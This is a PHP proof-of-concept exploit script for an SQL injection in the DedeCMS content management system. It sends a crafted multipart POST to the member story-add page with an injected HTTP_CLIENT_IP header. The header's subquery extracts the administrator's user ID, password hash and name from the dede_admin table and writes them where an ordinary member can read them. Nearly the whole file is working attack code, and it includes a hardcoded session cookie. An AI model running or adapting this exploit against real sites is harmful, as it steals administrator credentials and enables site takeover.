<?php
print_r("
+------------------------------------------------------------------+
POC For Getip() Vul Of Dedecms All version
Just work as php>=5&mysql>=4.1
BY  Flyh4t
+------------------------------------------------------------------+
");

if ($argc<3) {
	echo "Usage: php ".$argv[0]." host path \n";
	echo "host:      target server \n";
	echo "path:      path to Dedecms\n";
	echo "Example:\r\n";
	echo "php ".$argv[0]." localhost /dd/\n";
	die;
}
$host=$argv[1];
$path=$argv[2];
$cmd = "111.111.111.111','1173448061'),('1', '0', '0', '0', '1', '6',(SELECT concat(  userid, 0x5f, pwd, 0x5f, uname ) FROM dede_admin WHERE id =1), 'flyh4t', '3', '0', '1173448047', '1', '0', '0', '1', '0', '0', '0', '0', '0', '0', 'flyh4t', 'flyh4t', 'flyh4t', '127.0.0.1";
$data = '-----------------------------7d728d38400258
Content-Disposition: form-data; name="catid"

1
-----------------------------7d728d38400258
Content-Disposition: form-data; name="bookname"

1234
-----------------------------7d728d38400258
Content-Disposition: form-data; name="freenum"

6
-----------------------------7d728d38400258
Content-Disposition: form-data; name="litpic"; filename=""
Content-Type: application/octet-stream


-----------------------------7d728d38400258
Content-Disposition: form-data; name="author"

TEST1
-----------------------------7d728d38400258
Content-Disposition: form-data; name="pubdate"

2007-03-10 09:42:23
-----------------------------7d728d38400258
Content-Disposition: form-data; name="keywords"


-----------------------------7d728d38400258
Content-Disposition: form-data; name="description"


-----------------------------7d728d38400258
Content-Disposition: form-data; name="body"


-----------------------------7d728d38400258
Content-Disposition: form-data; name="Submit"

±£ ´æ
-----------------------------7d728d38400258--
';
$message = "POST ".$path."member/story_add_action.php"." HTTP/1.1\r\n";
$message .= "Accept: */*\r\n";
$message .= "Accept-Language: zh-cn\r\n";
$message .= "Content-Type: multipart/form-data; boundary=---------------------------7d7205a701dc\r\n";
$message .= "Accept-Encoding: gzip, deflate\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"."\r\n";
$message .= "Host: ".$host."\r\n";
$message .= "Content-length: ".strlen($data)."\r\n";
$message .= "Cache-Control: no-cache\r\n";
$message .= "HTTP_CLIENT_IP: ".$cmd."\r\n";
$message .= "Connection: Keep-Alive\r\n";
$message .= "Cookie: dushow1=none; dushow2=none; dushow3=none; dushow4=block; dushow5=none; dushow6=none; dushow7=none; dushow8=none; ENV_GOBACK_URL=%2Fdd%2Fmember%2Fstory_books.php; lastCidMenuckMd5=b5a811f6c2cc332f; lastCidTree=1; lastCidTreeckMd5=b5a811f6c2cc332f; DedeUserID=3; DedeUserIDckMd5=5abfbd257fa5e1b7; DedeLoginTime=1173446988; DedeLoginTimeckMd5=5247d6d7bc2d9308; PHPSESSID=395192c6b52de494a041275e5c797877\r\n";
$message .= "\r\n";
$message .= $data;
$ock=fsockopen($host,80);
if (!$ock) {
	echo 'No response from '.$host;
	die;
}
echo "[+]connected to the site!\r\n";
echo "[+]sending data now¡­¡­\r\n";
fputs($ock,$message);
echo "[+]done!\r\n";
echo "[+]view /member/story_books.php \r\n";
echo "[+]if the poc worked,you'll get the pass"
?>